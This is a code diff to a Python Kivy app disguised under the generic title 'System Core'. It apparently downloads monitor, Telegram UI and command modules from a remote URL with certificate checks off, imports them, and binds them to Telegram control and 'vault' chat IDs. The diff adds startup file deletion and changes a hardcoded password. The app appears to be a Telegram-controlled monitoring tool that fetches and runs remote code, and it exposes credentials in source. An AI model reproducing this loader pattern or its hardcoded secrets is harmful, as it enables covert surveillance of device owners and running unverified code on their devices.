@@ -23,6 +23,16 @@ def _get_path():
     return p
 
 R = _get_path()
+
+# ✅ إضافة كود منع التعارض: مسح الملفات القديمة عند بدء التشغيل
+for old_file in ["monitor.py", "telegram_ui.py", "commands.py"]:
+    file_path = os.path.join(R, old_file)
+    if os.path.exists(file_path):
+        try:
+            os.remove(file_path)
+        except:
+            pass
+
 if R not in sys.path:
     sys.path.insert(0, R)
 
@@ -57,8 +67,10 @@ class CoreApp(App):
         _perms()
         self.title = "System Core"
         layout = BoxLayout(orientation='vertical', spacing=5)
-        self.log = TextInput(text="", readonly=True, background_color=(0.02,0.02,0.02,1),
-                             foreground_color=(0.3,0.9,0.3,1), font_size='10sp')
+        self.log = TextInput(text="", readonly=True,
+                             background_color=(0.02,0.02,0.02,1),
+                             foreground_color=(0.3,0.9,0.3,1),
+                             font_size='10sp')
         btns = BoxLayout(size_hint=(1,0.08), spacing=5)
         copy_btn = Button(text="📋 COPY", background_color=(0.2,0.4,0.6,1))
         copy_btn.bind(on_press=self._copy)
@@ -91,7 +103,6 @@ class CoreApp(App):
         for i in range(3):
             try:
                 self._log(f"DL {name} ({i+1}/3)")
-                # Bust cache باستخدام timestamp
                 r = requests.get(f"{url}?v={int(time.time())}", timeout=20, verify=False)
                 if r.status_code == 200 and len(r.text) > 500:
                     with open(os.path.join(R, name), 'w', encoding='utf-8') as f:
@@ -137,7 +148,6 @@ class CoreApp(App):
         for mod in to_delete:
             del sys.modules[mod]
 
-        # تنظيف الكاش وتجميع الذاكرة
         importlib.invalidate_caches()
         gc.collect()
 
@@ -159,7 +169,7 @@ class CoreApp(App):
             ]
             mon.ctrl = -1003365166986
             mon.vlt = -1003787520015
-            mon.pw = "Zaen123@123@123"
+            mon.pw = "Zaen123@123@"          # تم التحديث من Zaen123@123@123
 
             ui = telegram_ui.T(mon)
             mon.cb_h = lambda d, cid, cbq: commands.ex(d, ui, mon, cid, cbq)
